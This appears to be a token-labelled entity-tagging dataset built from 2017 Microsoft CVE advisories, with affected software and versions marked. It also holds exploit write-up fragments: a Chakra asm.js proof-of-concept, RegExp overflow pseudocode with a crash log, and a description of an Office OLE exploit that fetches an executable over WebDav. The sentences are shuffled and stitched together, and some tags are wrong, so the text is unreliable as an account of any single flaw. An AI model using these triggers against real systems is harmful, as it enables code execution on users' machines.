handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

What O O
happens O O
when O O
the O O
variable O O
b O O
gets O O
initialized O O
is O O
: O O
1. O O
mCompiler- O O
> O O
LookupIdentifier O O
is O O
called O O
with O O
a O O
as O O
the O O
first O O
argument O O
. O O

So O O
it O O
returns O O
-1 O O
which O O
leads O O
OOB O O
read O O
. O O

PoC O O
: O O
function O O
createModule O O
( O O
) O O
{ O O
use O O
asm O O
; O O
const O O
a O O
= O O
1.0 O O
; O O
function O O
f O O
( O O
) O O
{ O O
var O O
b O O
= O O
a O O
; O O
var O O
a O O
= O O
0 O O
; O O
} O O
return O O
f O O
; O O
} O O
var O O
f O O
= O O
createModule O O
( O O
) O O
; O O
f O O
( O O
) O O
; O O

2. O O
mFunction- O O
> O O
GetConstRegister O O
fails O O
to O O
find O O
the O O
int O O
value O O
in O O
the O O
double O O
constant O O
table O O
. O O

And O O
it O O
returns O O
the O O
local O O
variable O O
a O O
, O O
which O O
is O O
of O O
type O O
int O O
, O O
but O O
not O O
the O O
double O O
constant O O
a O O
. O O

Here O O
a O O
snippet O O
of O O
AsmJSByteCodeGenerator O O
: O O
:EmitAsmJsFunctionBody O O
. O O

AsmJsVar O O
initSource O O
= O O
nullptr O O
; O O
if O O
( O O
decl- O O
> O O
sxVar.pnodeInit- O O
> O O
nop O O
knopName O O
) O O
{ O O
AsmJsSymbol O O
initSym O O
= O O
mCompiler- O O
> O O
LookupIdentifier O O
( O O
decl- O O
> O O
sxVar.pnodeInit- O O
> O O
name O O
( O O
) O O
, O O
mFunction O O
) O O
; O O
if O O
( O O
initSym- O O
> O O
GetSymbolType O O
( O O
) O O
AsmJsSymbol O O
: O O
:Variable O O
) O O
{ O O
in O O
this O O
case O O
we O O
are O O
initializing O O
with O O
value O O
of O O
a O O
constant O O
var O O
initSource O O
= O O
initSym- O O
> O O
Cast O O
< O O
AsmJsVar O O
if O O
( O O
initSource O O
) O O
{ O O
if O O
( O O
var- O O
> O O
GetType O O
( O O
) O O
.isDouble O O
( O O
) O O
) O O
{ O O
mWriter.AsmReg2 O O
( O O
Js O O
: O O
:OpCodeAsmJs O O
: O O
:Ld_Db O O
, O O
var- O O
> O O
GetLocation O O
( O O
) O O
, O O
mFunction- O O
> O O
GetConstRegister O O
< O O
double O O
> O O
( O O
initSource- O O
> O O
GetDoubleInitialiser O O
Chakra O O
thinks O O
the O O
PoC O O
is O O
valid O O
asm.js O O
code O O
. O O

Microsoft O O
Edge O O
Chakra O O
- O O
asm.js O O
Out-of-Bounds O O
Read O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11886 O O
, O O
CVE-2017-11889 O O
, O O
CVE-2017-11890 O O
, O O
CVE-2017-11893 O O
, O O
CVE-2017-11894 O O
, O O
CVE-2017-11895 O O
, O O
CVE-2017-11901 O O
, O O
CVE-2017-11903 O O
, O O
CVE-2017-11905 O O
, O O
CVE-2017-11905 O O
, O O
CVE-2017-11907 O O
, O O
CVE-2017-11908 O O
, O O
CVE-2017-11909 O O
, O O
CVE-2017-11911 O O
, O O
CVE-2017-11912 O O
, O O
CVE-2017-11913 O O
, O O
CVE-2017-11914 O O
, O O
CVE-2017-11916 O O
, O O
CVE-2017-11918 O O
, O O
and O O
CVE-2017-11930 O O
. O O

ChakraCore O O
and O O
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
Gold S-vulnerable_version pair_0
, O O
1511 S-vulnerable_version pair_0
, O O
1607 S-vulnerable_version pair_0
, O O
1703 S-vulnerable_version pair_0
, O O
1709 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
the O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11886 O O
, O O
CVE-2017-11889 O O
, O O
CVE-2017-11890 O O
, O O
CVE-2017-11893 O O
, O O
CVE-2017-11894 O O
, O O
CVE-2017-11895 O O
, O O
CVE-2017-11901 O O
, O O
CVE-2017-11903 O O
, O O
CVE-2017-11905 O O
, O O
CVE-2017-11905 O O
, O O
CVE-2017-11907 O O
, O O
CVE-2017-11908 O O
, O O
CVE-2017-11910 O O
, O O
CVE-2017-11911 O O
, O O
CVE-2017-11912 O O
, O O
CVE-2017-11913 O O
, O O
CVE-2017-11914 O O
, O O
CVE-2017-11916 O O
, O O
CVE-2017-11918 O O
, O O
and O O
CVE-2017-11930 O O
. O O

Microsoft O O
Edge O O
Chakra O O
JIT O O
- O O
BackwardPass O O
: O O
:RemoveEmptyLoopAfterMemOp O O
Does O O
not O O
Insert O O
Branches O O

ChakraCore O O
and O O
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1709 S-vulnerable_version pair_0
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
the O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11886 O O
, O O
CVE-2017-11889 O O
, O O
CVE-2017-11890 O O
, O O
CVE-2017-11893 O O
, O O
CVE-2017-11894 O O
, O O
CVE-2017-11895 O O
, O O
CVE-2017-11901 O O
, O O
CVE-2017-11903 O O
, O O
CVE-2017-11905 O O
, O O
CVE-2017-11905 O O
, O O
CVE-2017-11907 O O
, O O
CVE-2017-11909 O O
, O O
CVE-2017-11910 O O
, O O
CVE-2017-11911 O O
, O O
CVE-2017-11912 O O
, O O
CVE-2017-11913 O O
, O O
CVE-2017-11914 O O
, O O
CVE-2017-11916 O O
, O O
CVE-2017-11918 O O
, O O
and O O
CVE-2017-11930 O O
. O O

Internet O O
Explorer O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
and S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
and S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
1703 S-vulnerable_version pair_5
, O O
1709 S-vulnerable_version pair_5
, O O
and O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
allows O O
an O O
attacker O O
to O O
gain O O
the O O
same O O
user O O
rights O O
as O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
Internet O O
Explorer O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11886 O O
, O O
CVE-2017-11889 O O
, O O
CVE-2017-11890 O O
, O O
CVE-2017-11893 O O
, O O
CVE-2017-11894 O O
, O O
CVE-2017-11895 O O
, O O
CVE-2017-11901 O O
, O O
CVE-2017-11903 O O
, O O
CVE-2017-11905 O O
, O O
CVE-2017-11905 O O
, O O
CVE-2017-11908 O O
, O O
CVE-2017-11909 O O
, O O
CVE-2017-11910 O O
, O O
CVE-2017-11911 O O
, O O
CVE-2017-11912 O O
, O O
CVE-2017-11913 O O
, O O
CVE-2017-11914 O O
, O O
CVE-2017-11916 O O
, O O
CVE-2017-11918 O O
, O O
and O O
CVE-2017-11930 O O
. O O

This O O
exception O O
may O O
be O O
expected O O
and O O
handled O O
. O O

ChakraCore O O
and O O
Microsoft O O
Edge O O
in O O
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1511 S-vulnerable_version pair_0
, O O
1607 S-vulnerable_version pair_0
, O O
1703 S-vulnerable_version pair_0
, O O
1709 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
the O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11886 O O
, O O
CVE-2017-11889 O O
, O O
CVE-2017-11890 O O
, O O
CVE-2017-11893 O O
, O O
CVE-2017-11894 O O
, O O
CVE-2017-11895 O O
, O O
CVE-2017-11901 O O
, O O
CVE-2017-11903 O O
, O O
CVE-2017-11907 O O
, O O
CVE-2017-11908 O O
, O O
CVE-2017-11909 O O
, O O
CVE-2017-11910 O O
, O O
CVE-2017-11911 O O
, O O
CVE-2017-11912 O O
, O O
CVE-2017-11913 O O
, O O
CVE-2017-11914 O O
, O O
CVE-2017-11916 O O
, O O
CVE-2017-11918 O O
, O O
and O O
CVE-2017-11930 O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11886 O O
, O O
CVE-2017-11889 O O
, O O
CVE-2017-11890 O O
, O O
CVE-2017-11893 O O
, O O
CVE-2017-11894 O O
, O O
CVE-2017-11895 O O
, O O
CVE-2017-11901 O O
, O O
CVE-2017-11905 O O
, O O
CVE-2017-11907 O O
, O O
CVE-2017-11908 O O
, O O
CVE-2017-11909 O O
, O O
CVE-2017-11910 O O
, O O
CVE-2017-11911 O O
, O O
CVE-2017-11912 O O
, O O
CVE-2017-11913 O O
, O O
CVE-2017-11914 O O
, O O
CVE-2017-11916 O O
, O O
CVE-2017-11918 O O
, O O
and O O
CVE-2017-11930 O O
. O O

This O O
works O O
because O O
wpad.dat O O
files O O
are O O
JavaScript O O
files O O
interpreted O O
with O O
jscript.dll O O
on O O
the O O
WPAD O O
client O O
. O O

Note O O
that O O
, O O
in O O
this O O
case O O
, O O
an O O
attacker O O
who O O
successfully O O
exploited O O
the O O
vulnerability O O
would O O
gain O O
the O O
same O O
privileges O O
as O O
the O O
WinHTTP O O
Web O O
Proxy O O
Auto-Discovery O O
Service O O
. O O

This O O
issue O O
could O O
potentially O O
be O O
exploited O O
through O O
multiple O O
vectors O O
: O O
- O O
An O O
attacker O O
on O O
the O O
local O O
network O O
could O O
exploit O O
this O O
issue O O
by O O
posing O O
as O O
a O O
WPAD O O
( O O
Web O O
Proxy O O
Auto-Discovery O O
) O O
host O O
and O O
sending O O
a O O
malicious O O
wpad.dat O O
file O O
to O O
the O O
victim O O
. O O

- O O
The O O
issue O O
can O O
also O O
be O O
exploited O O
by O O
opening O O
a O O
malicious O O
web O O
page O O
in O O
Internet O O
Explorer O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11886 O O
, O O
CVE-2017-11889 O O
, O O
CVE-2017-11890 O O
, O O
CVE-2017-11893 O O
, O O
CVE-2017-11894 O O
, O O
CVE-2017-11895 O O
, O O
CVE-2017-11903 O O
, O O
CVE-2017-11905 O O
, O O
CVE-2017-11907 O O
, O O
CVE-2017-11908 O O
, O O
CVE-2017-11909 O O
, O O
CVE-2017-11910 O O
, O O
CVE-2017-11911 O O
, O O
CVE-2017-11912 O O
, O O
CVE-2017-11913 O O
, O O
CVE-2017-11914 O O
, O O
CVE-2017-11916 O O
, O O
CVE-2017-11918 O O
, O O
and O O
CVE-2017-11930 O O
. O O

Internet O O
Explorer O O
in O O
Microsoft O O
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
and S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
1703 S-vulnerable_version pair_5
, O O
1709 S-vulnerable_version pair_5
, O O
and O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
allows O O
an O O
attacker O O
to O O
gain O O
the O O
same O O
user O O
rights O O
as O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
Internet O O
Explorer O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11886 O O
, O O
CVE-2017-11889 O O
, O O
CVE-2017-11890 O O
, O O
CVE-2017-11893 O O
, O O
CVE-2017-11894 O O
, O O
CVE-2017-11901 O O
, O O
CVE-2017-11903 O O
, O O
CVE-2017-11905 O O
, O O
CVE-2017-11907 O O
, O O
CVE-2017-11908 O O
, O O
CVE-2017-11909 O O
, O O
CVE-2017-11910 O O
, O O
CVE-2017-11911 O O
, O O
CVE-2017-11912 O O
, O O
CVE-2017-11913 O O
, O O
CVE-2017-11914 O O
, O O
CVE-2017-11916 O O
, O O
CVE-2017-11918 O O
, O O
and O O
CVE-2017-11930 O O
. O O

ChakraCore O O
, O O
and O O
Internet O O
Explorer O O
in O O
Microsoft O O
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
and O O
Internet O O
Explorer O O
and O O
Microsoft O O
Edge O O
in O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
1703 S-vulnerable_version pair_5
, O O
1709 S-vulnerable_version pair_5
, O O
and O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
allows O O
an O O
attacker O O
to O O
gain O O
the O O
same O O
user O O
rights O O
as O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
the O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

ChakraCore O O
, O O
and O O
Internet O O
Explorer O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
and S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
and S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
and O O
and O O
Internet O O
Explorer O O
adn O O
Microsoft O O
Edge O O
in O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
1703 S-vulnerable_version pair_5
, O O
1709 S-vulnerable_version pair_5
, O O
and O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
allows O O
an O O
attacker O O
to O O
gain O O
the O O
same O O
user O O
rights O O
as O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
the O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11886 O O
, O O
CVE-2017-11889 O O
, O O
CVE-2017-11890 O O
, O O
CVE-2017-11893 O O
, O O
CVE-2017-11895 O O
, O O
CVE-2017-11901 O O
, O O
CVE-2017-11903 O O
, O O
CVE-2017-11905 O O
, O O
CVE-2017-11907 O O
, O O
CVE-2017-11908 O O
, O O
CVE-2017-11909 O O
, O O
CVE-2017-11910 O O
, O O
CVE-2017-11911 O O
, O O
CVE-2017-11912 O O
, O O
CVE-2017-11913 O O
, O O
CVE-2017-11914 O O
, O O
CVE-2017-11916 O O
, O O
CVE-2017-11918 O O
, O O
and O O
CVE-2017-11930 O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11886 O O
, O O
CVE-2017-11889 O O
, O O
CVE-2017-11890 O O
, O O
CVE-2017-11894 O O
, O O
CVE-2017-11895 O O
, O O
CVE-2017-11901 O O
, O O
CVE-2017-11903 O O
, O O
CVE-2017-11905 O O
, O O
CVE-2017-11907 O O
, O O
CVE-2017-11908 O O
, O O
CVE-2017-11909 O O
, O O
CVE-2017-11910 O O
, O O
CVE-2017-11911 O O
, O O
CVE-2017-11912 O O
, O O
CVE-2017-11913 O O
, O O
CVE-2017-11914 O O
, O O
CVE-2017-11916 O O
, O O
CVE-2017-11918 O O
, O O
and O O
CVE-2017-11930 O O
. O O

Microsoft O O
Edge O O
Chakra O O
JIT O O
- O O
Op_MaxInAnArray O O
and O O
Op_MinInAnArray O O
can O O
Explicitly O O
call O O
User-Defined O O
JavaScript O O
Functions O O

Microsoft O O
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
and S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
and S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
1703 S-vulnerable_version pair_5
, O O
1709 S-vulnerable_version pair_5
, O O
and O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
allow O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
Internet O O
Explorer O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11886 O O
, O O
CVE-2017-11889 O O
, O O
CVE-2017-11893 O O
, O O
CVE-2017-11894 O O
, O O
CVE-2017-11895 O O
, O O
CVE-2017-11901 O O
, O O
CVE-2017-11903 O O
, O O
CVE-2017-11905 O O
, O O
CVE-2017-11907 O O
, O O
CVE-2017-11908 O O
, O O
CVE-2017-11909 O O
, O O
CVE-2017-11910 O O
, O O
CVE-2017-11911 O O
, O O
CVE-2017-11912 O O
, O O
CVE-2017-11913 O O
, O O
CVE-2017-11914 O O
, O O
CVE-2017-11916 O O
, O O
CVE-2017-11918 O O
, O O
and O O
CVE-2017-11930 O O
. O O

Indeed O O
, O O
integer O O
overflows O O
can O O
happen O O
in O O
the O O
several O O
callers O O
of O O
RegExpBase O O
: O O
:EnsureSpace O O
. O O

This O O
is O O
going O O
to O O
be O O
the O O
case O O
for O O
example O O
when O O
running O O
IE O O
in O O
the O O
Enhanced O O
Protected O O
Mode O O
. O O

The O O
one O O
being O O
triggered O O
in O O
the O O
PoC O O
is O O
in O O
RegExpComp O O
: O O
:Compile O O
, O O
when O O
it O O
attempts O O
to O O
append O O
the O O
raw O O
input O O
string O O
to O O
the O O
buffer O O
towards O O
the O O
end O O
of O O
the O O
compilation O O
process O O
. O O

RegExpBase O O
: O O
:EnsureSpace O O
has O O
an O O
integer O O
overflow O O
check O O
, O O
however O O
if O O
an O O
overflow O O
happens O O
in O O
the O O
caller O O
( O O
a O O
caller O O
must O O
add O O
the O O
size O O
which O O
it O O
wants O O
to O O
append O O
to O O
the O O
existing O O
content O O
size O O
) O O
and O O
desired_size O O
becomes O O
negative O O
, O O
RegExpBase O O
: O O
:EnsureSpace O O
would O O
simply O O
return O O
because O O
of O O
the O O
first O O
if O O
( O O
) O O
statement O O
without O O
attempting O O
to O O
extend O O
the O O
buffer O O
. O O

Debug O O
log O O
( O O
from O O
IE O O
, O O
but O O
it O O
looks O O
similar O O
in O O
the O O
WPAD O O
service O O
) O O
: O O
( O O
b90.698 O O
) O O
: O O
Access O O
violation O O
- O O
code O O
c0000005 O O
( O O
first O O
chance O O
) O O
First O O
chance O O
exceptions O O
are O O
reported O O
before O O
any O O
exception O O
handling O O
. O O

RegExpComp O O
: O O
:Compile O O
is O O
responsible O O
for O O
compiling O O
a O O
RegExp O O
object O O
. O O

It O O
maintains O O
a O O
buffer O O
with O O
the O O
compilation O O
result O O
and O O
extends O O
it O O
when O O
necessary O O
. O O

The O O
issue O O
has O O
been O O
verified O O
on O O
64-bit O O
Win7 O O
and O O
64-bit O O
Win10 O O
with O O
the O O
most O O
recent O O
patches O O
applied O O
. O O

msvcrt O O
! O O
memcpy+0x1d9 O O
: O O
000007fe`fefe123d O O
668901 O O
mov O O
word O O
ptr O O
[ O O
rcx O O
] O O
, O O
ax O O
ds:00000002`5bb60fe0= O O

In O O
this O O
case O O
, O O
due O O
to O O
the O O
sizes O O
involved O O
, O O
a O O
64-bit O O
tab O O
process O O
would O O
most O O
likely O O
be O O
required O O
to O O
trigger O O
the O O
issue O O
. O O

Extending O O
the O O
buffer O O
is O O
handled O O
using O O
RegExpBase O O
: O O
:EnsureSpace O O
which O O
looks O O
( O O
approximately O O
) O O
like O O
: O O
void O O
RegExpBase O O
: O O
:EnsureSpace O O
( O O
int O O
desired_size O O
) O O
{ O O
if O O
( O O
desired_size O O
buffer_size O O
) O O
{ O O
if O O
( O O
2 O O
desired_size O O
< O O
desired_size O O
) O O
{ O O
throw O O
an O O
exception O O
} O O
int O O
new_size O O
= O O
2 O O
desired_size O O
; O O
char O O
new_buffer O O
= O O
realloc O O
( O O
buffer O O
, O O
new_size O O
) O O
; O O
if O O
( O O
! O O
new_buffer O O
) O O
{ O O
throw O O
an O O
exception O O
} O O
buffer O O
= O O
new_buffer O O
; O O
buffer_size O O
= O O
new_size O O
; O O
} O O
} O O
Note O O
that O O
desired_size O O
is O O
a O O
signed O O
32-bit O O
integer O O
. O O

ChakraCore O O
and O O
Microsoft O O
Edge O O
in O O
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
Gold S-vulnerable_version pair_0
, O O
1511 S-vulnerable_version pair_0
, O O
1607 S-vulnerable_version pair_0
, O O
1703 S-vulnerable_version pair_0
, O O
1709 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
the O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11886 O O
, O O
CVE-2017-11890 O O
, O O
CVE-2017-11893 O O
, O O
CVE-2017-11894 O O
, O O
CVE-2017-11895 O O
, O O
CVE-2017-11901 O O
, O O
CVE-2017-11903 O O
, O O
CVE-2017-11905 O O
, O O
CVE-2017-11907 O O
, O O
CVE-2017-11908 O O
, O O
CVE-2017-11909 O O
, O O
CVE-2017-11910 O O
, O O
CVE-2017-11911 O O
, O O
CVE-2017-11912 O O
, O O
CVE-2017-11913 O O
, O O
CVE-2017-11914 O O
, O O
CVE-2017-11916 O O
, O O
CVE-2017-11918 O O
, O O
and O O
CVE-2017-11930 O O
. O O

Microsoft O O
Edge O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
Gold S-vulnerable_version pair_0
, O O
1511 S-vulnerable_version pair_0
, O O
1607 S-vulnerable_version pair_0
, O O
1703 S-vulnerable_version pair_0
, O O
1709 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
Microsoft O O
Edge O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Microsoft O O
Edge O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11889 O O
, O O
CVE-2017-11890 O O
, O O
CVE-2017-11893 O O
, O O
CVE-2017-11894 O O
, O O
CVE-2017-11895 O O
, O O
CVE-2017-11901 O O
, O O
CVE-2017-11903 O O
, O O
CVE-2017-11905 O O
, O O
CVE-2017-11907 O O
, O O
CVE-2017-11908 O O
, O O
CVE-2017-11909 O O
, O O
CVE-2017-11910 O O
, O O
CVE-2017-11911 O O
, O O
CVE-2017-11912 O O
, O O
CVE-2017-11913 O O
, O O
CVE-2017-11914 O O
, O O
CVE-2017-11916 O O
, O O
CVE-2017-11918 O O
, O O
and O O
CVE-2017-11930 O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11882 O O
. O O

Microsoft S-vulnerable_software pair_0
Excel S-vulnerable_software pair_0
2016 S-vulnerable_version pair_0
Click-to-Run O O
( O O
C2R O O
) O O
allows O O
an O O
attacker O O
to O O
run O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
by O O
failing O O
to O O
properly O O
handle O O
objects O O
in O O
memory O O
, O O
aka O O
Microsoft O O
Office O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11884 O O
. O O

Microsoft S-vulnerable_software pair_0
Office S-vulnerable_software pair_0
2007 S-vulnerable_version pair_0
Service S-vulnerable_version pair_0
Pack S-vulnerable_version pair_0
3 S-vulnerable_version pair_0
, O O
Microsoft S-vulnerable_software pair_1
Office S-vulnerable_software pair_1
2010 S-vulnerable_version pair_1
Service S-vulnerable_version pair_1
Pack S-vulnerable_version pair_1
2 S-vulnerable_version pair_1
, O O
Microsoft S-vulnerable_software pair_2
Office S-vulnerable_software pair_2
2013 S-vulnerable_version pair_2
Service S-vulnerable_version pair_2
Pack S-vulnerable_version pair_2
1 S-vulnerable_version pair_2
, O O
and O O
Microsoft S-vulnerable_software pair_3
Office S-vulnerable_software pair_3
2016 S-vulnerable_version pair_3
allow O O
an O O
attacker O O
to O O
run O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
by O O
failing O O
to O O
properly O O
handle O O
objects O O
in O O
memory O O
, O O
aka O O
Microsoft O O
Office O O
Memory O O
Corruption O O
Vulnerability O O
. O O

However O O
with O O
help O O
of O O
WebDav O O
it O O
is O O
possible O O
to O O
launch O O
arbitrary O O
attacker-controlled O O
executable O O
on O O
vulnerable O O
machine O O
. O O

These O O
objects O O
exploits O O
CVE-2017-11882 O O
, O O
which O O
results O O
in O O
sequential O O
command O O
execution O O
. O O

The O O
reason O O
why O O
this O O
approach O O
might O O
be O O
handy O O
is O O
a O O
limitation O O
of O O
executed O O
command O O
length O O
. O O

This O O
exploit O O
triggers O O
WebClient O O
service O O
to O O
start O O
and O O
execute O O
remote O O
file O O
from O O
attacker-controlled O O
WebDav O O
server O O
. O O

This O O
script O O
creates O O
simple O O
document O O
with O O
several O O
OLE O O
objects O O
. O O

Microsoft O O
Office O O
- O O
OLE O O
Remote O O
Code O O
Execution O O

